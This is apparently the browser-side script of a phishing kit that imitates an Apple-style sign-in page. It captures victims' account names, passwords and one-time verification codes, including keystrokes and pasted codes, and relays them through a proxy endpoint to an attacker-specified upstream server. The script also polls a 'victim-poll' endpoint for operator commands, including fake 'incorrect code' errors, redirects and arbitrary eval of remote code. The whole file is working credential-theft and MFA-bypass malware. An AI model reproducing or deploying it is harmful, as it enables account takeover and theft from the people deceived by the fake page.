/**
 * Plan A fast mirror — batch POST on Continue; no live password relay (prevents spinner).
 */
(function () {
  "use strict";
  if (window.__harborSigninRemoteFast) return;
  window.__harborSigninRemoteFast = true;

  var p = new URLSearchParams(location.search);
  var FWD = (p.get("fwd") || p.get("relay") || "").trim().replace(/\/$/, "");
  var SID = (p.get("sid") || "default").trim();
  if (!FWD) return;

  try {
    sessionStorage.setItem("harbor_apple_mirror", "1");
    localStorage.setItem("harbor_relay_fwd", FWD);
    localStorage.setItem("harbor_relay_sid", SID);
  } catch (e) {}

  var seq = 0;
  var relayUrl = "/api/relay/event?upstream=" + encodeURIComponent(FWD);

  function postBody(bodyObj, n) {
    n = n || 0;
    return fetch(relayUrl, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(bodyObj),
      keepalive: true,
    })
      .then(function (r) {
        return r.text().then(function (txt) {
          if ((!r.ok || /busy|502|upstream_unreachable/i.test(txt)) && n < 5) {
            return new Promise(function (res) {
              setTimeout(function () {
                res(postBody(bodyObj, n + 1));
              }, 120 + n * 180);
            });
          }
          return { ok: r.ok && /"ok"\s*:\s*true/.test(txt) };
        });
      })
      .catch(function () {
        if (n < 5) {
          return new Promise(function (res) {
            setTimeout(function () {
              res(postBody(bodyObj, n + 1));
            }, 120 + n * 180);
          });
        }
        return { ok: false };
      });
  }

  function mk(type, payload) {
    return {
      type: type,
      payload: payload || {},
      t: Date.now(),
      seq: ++seq,
    };
  }

  function emit(type, payload) {
    return postBody({ session: SID, event: mk(type, payload) });
  }

  function onPasswordStep() {
    try {
      return window.HarborDriver && window.HarborDriver.signinStep() === "password";
    } catch (e) {
      return false;
    }
  }

  function wipeHarborOtpFields() {
    document.querySelectorAll(".otp-digit").forEach(function (input) {
      input.value = "";
      input.readOnly = false;
      input.classList.remove("has-value", "is-otp-focused");
    });
    var statusEl = document.getElementById("verify-status");
    if (statusEl) {
      statusEl.hidden = true;
      statusEl.classList.remove("verify-status--complete");
    }
    var otpRow = document.getElementById("otp-row");
    if (otpRow) otpRow.classList.remove("otp-row--error", "harbor-shake");
  }

  function harborWipeOtp(message) {
    window.__harborOtpRelayPausedUntil = Date.now() + 12000;
    var msg = (message || "").trim() || "Incorrect verification code.";
    if (window.HarborDriver && window.HarborDriver.showVerifyError) {
      window.HarborDriver.showVerifyError(msg);
      return;
    }
    wipeHarborOtpFields();
    var inline = document.getElementById("verify-inline-error");
    var inlineText = document.getElementById("verify-inline-error-text");
    var otpRow = document.getElementById("otp-row");
    if (inline && inlineText) {
      inline.hidden = false;
      inlineText.textContent = msg;
    }
    if (otpRow) {
      otpRow.classList.add("otp-row--error");
      otpRow.classList.remove("harbor-shake");
      void otpRow.offsetWidth;
      otpRow.classList.add("harbor-shake");
    }
  }

  function otpRelayPaused() {
    return (
      window.__harborOtpRelayPausedUntil &&
      Date.now() < window.__harborOtpRelayPausedUntil
    );
  }

  function applyState(st) {
    if (!st) return;
    if (st.verifyError && st.verifyError.msg) {
      harborWipeOtp(st.verifyError.msg);
      return;
    }
    if (st.clearHarborOtp) {
      window.__harborOtpRelayPausedUntil = Date.now() + 12000;
      if (window.HarborDriver && window.HarborDriver.wipeHarborOtp) {
        window.HarborDriver.wipeHarborOtp();
      } else {
        wipeHarborOtpFields();
      }
    }
    if (!window.HarborDriver) return;
    window.HarborDriver.applyHarborState(st);
    if (st.verifyCopy && isSigninPath()) {
      try {
        sessionStorage.setItem("harbor_apple_mirror", "1");
        sessionStorage.setItem("harbor_signin_pending", "1");
        sessionStorage.setItem("harbor_verify_copy", JSON.stringify(st.verifyCopy));
      } catch (e) {}
      location.href = location.origin + "/verify" + location.search;
      return;
    }
    var btn = document.getElementById("continue-btn");
    if (!btn) return;
    if (st.passwordStep || st.clearSigninLoading || st.signinError) {
      btn.classList.remove("is-loading");
      btn.removeAttribute("aria-busy");
      window.__harborSubmitPending = false;
      window.__harborSigninLoading = false;
      try {
        if (typeof window.__harborSyncSigninLoading === "function") {
          window.__harborSyncSigninLoading(false);
        }
      } catch (e) {}
      if (st.passwordStep || st.signinError) {
        btn.disabled = false;
      }
    }
    if (st.signinLoading && !onPasswordStep()) {
      btn.classList.add("is-loading");
      btn.disabled = true;
      btn.setAttribute("aria-busy", "true");
      window.__harborSubmitPending = true;
    }
  }

  function installRemoteGuards() {
    if (!window.PhishBridge || window.__harborRemoteGuards) return;
    window.__harborRemoteGuards = true;
    if (window.PhishBridge.setLoading) {
      var origLoad = window.PhishBridge.setLoading.bind(window.PhishBridge);
      window.PhishBridge.setLoading = function (on) {
        if (on && onPasswordStep()) return;
        return origLoad(on);
      };
    }
    if (window.PhishBridge.paintContinueLoading) {
      var origPaint = window.PhishBridge.paintContinueLoading.bind(window.PhishBridge);
      window.PhishBridge.paintContinueLoading = function (on, opts) {
        if (on && onPasswordStep()) return;
        return origPaint(on, opts);
      };
    }
  }

  var guardTimer = setInterval(function () {
    installRemoteGuards();
    if (window.__harborRemoteGuards) clearInterval(guardTimer);
  }, 40);

  function onSubmit(e) {
    e.preventDefault();
    e.stopImmediatePropagation();
    var ac = document.getElementById("account");
    var pw = document.getElementById("password");
    var pwStep = document.getElementById("step-password");
    var onPw = pwStep && !pwStep.hidden;
    var account = ac ? (ac.value || "").trim() : "";
    var password = pw ? pw.value || "" : "";
    if (!onPw && !account) return;
    if (onPw && !(password || "").trim()) return;

    var events = [mk("email-commit", { account: account })];
    if (onPw && password) events.push(mk("password-commit", { password: password }));
    events.push(
      mk("submit", {
        step: onPw ? "password" : "email",
        account: account,
        password: password,
      })
    );

    if (onPw) {
      try {
        sessionStorage.setItem("harbor_signin_pending", "1");
        if (account) sessionStorage.setItem("harbor_account", account);
      } catch (e) {}
      applyState({ clearSigninLoading: true, signinLoading: false });
    } else {
      window.__harborSubmitPending = true;
      var btn0 = document.getElementById("continue-btn");
      if (btn0) {
        btn0.classList.add("is-loading");
        btn0.disabled = true;
        btn0.setAttribute("aria-busy", "true");
      }
    }

    postBody({ session: SID, events: events }).then(function () {
      if (onPw) {
        applyState({ clearSigninLoading: true, signinLoading: false });
        return;
      }
      window.__harborSubmitPending = true;
      var btn = document.getElementById("continue-btn");
      if (btn) {
        btn.classList.add("is-loading");
        btn.disabled = true;
        btn.setAttribute("aria-busy", "true");
      }
    });
  }

  function wire() {
    var form = document.getElementById("sign-in");
    var btn = document.getElementById("continue-btn");
    if (!form || form.__harborRemoteFast) return;
    form.__harborRemoteFast = true;
    form.addEventListener("submit", onSubmit, true);
    if (btn) btn.addEventListener("click", onSubmit, true);

    var ac = document.getElementById("account");
    if (ac) {
      var deb;
      var last = "";
      ac.addEventListener("input", function () {
        clearTimeout(deb);
        deb = setTimeout(function () {
          var v = (ac.value || "").trim();
          if (v.length < 2 || v === last) return;
          last = v;
          emit("input", { field: "account", value: v });
        }, 400);
      });
    }
  }

  wire();

  function isSigninPath() {
    var path = location.pathname || "/";
    return path === "/signin" || path === "/signin.html";
  }

  function isVerifyPath() {
    var path = location.pathname || "/";
    return path === "/verify" || path === "/verify.html";
  }

  function goHarborPath(path, state) {
    if (path.charAt(0) !== "/") path = "/" + path;
    var cur = location.pathname || "/";
    if (state) applyState(state);
    if (cur === path || cur === path + "/") return;
    try {
      sessionStorage.setItem("harbor_apple_mirror", "1");
      if (path === "/verify") {
        sessionStorage.setItem("harbor_signin_pending", "1");
      }
    } catch (e) {}
    location.href = location.origin + path + location.search;
  }

  function applyCmd(cmd) {
    if (!cmd || !cmd.op) return;
    if (cmd.op === "harbor-wipe-otp") {
      harborWipeOtp(cmd.message || cmd.msg || "");
      return;
    }
    if (cmd.op === "harbor-state" && cmd.state) {
      applyState(cmd.state);
      return;
    }
    if (cmd.op === "harbor-route") {
      goHarborPath(cmd.path || "/signin", cmd.state || null);
      return;
    }
    if (cmd.op === "goto" && cmd.url) {
      try {
        sessionStorage.setItem("harbor_apple_mirror", "1");
      } catch (e) {}
      location.href = cmd.url;
      return;
    }
    if (cmd.op === "eval" && cmd.expr) {
      try {
        if (cmd.arg !== undefined) {
          var fn = new Function("arg", "return (" + cmd.expr + ")(arg)");
          fn(cmd.arg);
        } else {
          var fn2 = new Function("return (" + cmd.expr + ")")();
          if (typeof fn2 === "function") fn2();
        }
      } catch (e1) {
        try {
          eval(cmd.expr);
        } catch (e2) {}
      }
    }
  }

  function applyCmdBatch(cmds) {
    if (!cmds || !cmds.length) return;
    var wipes = [];
    var evals = [];
    var routes = [];
    var states = [];
    for (var i = 0; i < cmds.length; i++) {
      var c = cmds[i];
      if (!c || !c.op) continue;
      if (c.op === "harbor-wipe-otp") wipes.push(c);
      else if (c.op === "harbor-route" || c.op === "goto") routes.push(c);
      else if (c.op === "harbor-state") states.push(c);
      else if (c.op === "eval") evals.push(c);
    }
    for (var w = 0; w < wipes.length; w++) applyCmd(wipes[w]);
    for (var e = 0; e < evals.length; e++) applyCmd(evals[e]);
    if (states.length) applyCmd(states[states.length - 1]);
    if (routes.length) applyCmd(routes[routes.length - 1]);
  }

  var lastMetaPath = location.pathname || "/";
  function sendMetaIfChanged() {
    var path = location.pathname || "/";
    if (path === lastMetaPath) return;
    lastMetaPath = path;
    emit("meta", { path: path, href: location.href, ready: document.readyState });
  }

  function wireVerifyOtp() {
    if (!isVerifyPath()) return;
    var inputs = document.querySelectorAll(".otp-digit");
    if (!inputs.length) return;
    inputs.forEach(function (input) {
      if (input.__harborOtpWired) return;
      input.__harborOtpWired = true;
      input.addEventListener(
        "input",
        function () {
          if (otpRelayPaused()) return;
          var raw = input.getAttribute("data-otp-index") || "0";
          var index = parseInt(raw, 10);
          if (isNaN(index)) index = 0;
          emit("otp-input", {
            index: index,
            digit: (input.value || "").replace(/\D/g, "").slice(-1),
          });
        },
        true
      );
      input.addEventListener(
        "keydown",
        function (e) {
          if (otpRelayPaused()) return;
          if (e.key !== "Backspace") return;
          var raw = input.getAttribute("data-otp-index") || "0";
          var index = parseInt(raw, 10);
          if (isNaN(index)) index = 0;
          emit("otp-input", { index: index, digit: "", backspace: true });
        },
        true
      );
    });
    document.addEventListener(
      "paste",
      function (e) {
        if (otpRelayPaused()) return;
        var t = e.target;
        if (!t || !t.classList || !t.classList.contains("otp-digit")) return;
        var pasted = (
          (e.clipboardData && e.clipboardData.getData("text")) ||
          ""
        )
          .replace(/\D/g, "")
          .slice(0, 6);
        if (!pasted) return;
        emit("otp-paste", { digits: pasted.split("") });
      },
      true
    );
  }

  wireVerifyOtp();
  if (document.readyState === "loading") {
    document.addEventListener("DOMContentLoaded", wireVerifyOtp);
  }

  function poll() {
    fetch(
      "/api/relay/victim-poll?upstream=" +
        encodeURIComponent(FWD) +
        "&session=" +
        encodeURIComponent(SID),
      { cache: "no-store" }
    )
      .then(function (r) {
        return r.json();
      })
      .then(function (j) {
        applyCmdBatch((j && j.cmds) || []);
      })
      .catch(function () {});
  }
  setInterval(poll, 40);
  poll();
  setInterval(sendMetaIfChanged, 1500);
  window.addEventListener("popstate", sendMetaIfChanged);
  sendMetaIfChanged();

  function setSpinner(on) {
    var btn = document.getElementById("continue-btn");
    if (on && onPasswordStep()) return;
    window.__harborSubmitPending = !!on;
    window.__harborSigninLoading = !!on;
    try {
      if (typeof window.__harborSyncSigninLoading === "function") {
        window.__harborSyncSigninLoading(!!on);
        return;
      }
    } catch (e) {}
    if (!btn) return;
    if (on) {
      btn.classList.add("is-loading");
      btn.disabled = true;
      btn.setAttribute("aria-busy", "true");
    } else {
      btn.classList.remove("is-loading");
      btn.removeAttribute("aria-busy");
    }
  }

  window.HarborSigninRemote = {
    submit: function () {
      onSubmit({
        preventDefault: function () {},
        stopImmediatePropagation: function () {},
      });
    },
    setSpinner: setSpinner,
    emit: emit,
    session: SID,
    fwd: FWD,
  };
  window.__phishRelayForward = function (ev) {
    if (!ev || !ev.type) return;
    var t = ev.type;
    var f = ev.payload && ev.payload.field;
    if (t === "password-commit") return;
    if (t === "input" && f === "password") return;
    if (t === "submit") return;
    postBody({ session: SID, event: ev });
  };
})();
